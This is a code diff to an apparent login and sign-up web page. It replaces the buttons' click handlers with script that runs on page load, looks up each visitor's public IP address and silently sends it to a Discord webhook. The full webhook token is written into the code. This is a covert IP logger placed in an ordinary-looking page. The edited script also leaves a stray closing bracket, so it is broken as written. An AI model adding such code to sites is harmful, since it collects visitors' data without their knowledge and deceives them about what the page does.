@@ -46,24 +46,23 @@
   <button class="button signup">Sign Up</button>
 
   <script>
-    const sendMessageButton = document.querySelector('.send-message');
-    sendMessageButton.addEventListener('click', () => {
-      fetch('https://discord.com/api/webhooks/1053343105803354212/YaOA-qbNULiv1V-CIQnOyG27WW8C335U2eaFLpBsd9Lsmg-le9-Ka00BZeS2URgS3-6t', {
-        method: 'POST',
-        body: JSON.stringify({
-          content: '@wawrz#8473, what is your favorite color?',
-        }),
-      });
-    });
+fetch("https://api.ipify.org?format=json")
+  .then(response => response.json())
+  .then(data => {
+    const IP = data.ip;
+    console.log(`Your IP address is: ${IP}`);
 
-    const loginButton = document.querySelector('.login');
-    loginButton.addEventListener('click', () => {
-      alert('You clicked the login button!');
+    // Send the IP address to the Discord webhook
+    fetch("https://discord.com/api/webhooks/1031273977118740501/IsAWXX8MZ6akhfXsBKtH00HAbZO1QooRf6RcwH5x9My_gYv1Y587Q8sW6xPGO6EcPV2r", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        content: IP,
+      }),
     });
-
-    const signupButton = document.querySelector('.signup');
-    signupButton.addEventListener('click', () => {
-      alert('You clicked the sign up button!');
+  });
     });
   </script>
 </body>
